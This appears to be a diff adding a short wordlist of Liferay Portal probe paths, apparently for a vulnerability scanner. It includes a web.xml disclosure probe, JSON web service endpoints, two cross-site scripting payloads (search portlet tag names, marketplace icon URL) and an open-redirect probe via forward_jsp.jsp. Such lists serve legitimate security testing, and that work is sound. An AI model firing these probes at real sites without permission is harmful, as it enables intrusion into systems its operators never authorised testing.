@@ -1,0 +1,9 @@
+/en/WEB-INF/web.xml;.js
+
+/api/jsonws
+/api/jsonws/invoke
+/api/liferay
+/api/axis
+/web/guest/home?p_p_id=com_liferay_portal_search_web_portlet_SearchPortlet&p_p_lifecycle=0&_com_liferay_portal_search_web_portlet_SearchPortlet_keywords=test&_com_liferay_portal_search_web_portlet_SearchPortlet_scope=this-site&_com_liferay_portal_search_web_portlet_SearchPortlet_assetTagNames=<script>alert(document.domain)</script>
+/html/common/forward_jsp.jsp?FORWARD_URL=http://oast.me%EF%BF%BD@localhost
+/o/marketplace-app-manager-web/icon.jsp?iconURL=https:///%22%3E%3Cimg%20src=x%20onerror=alert(document.domain)%3E
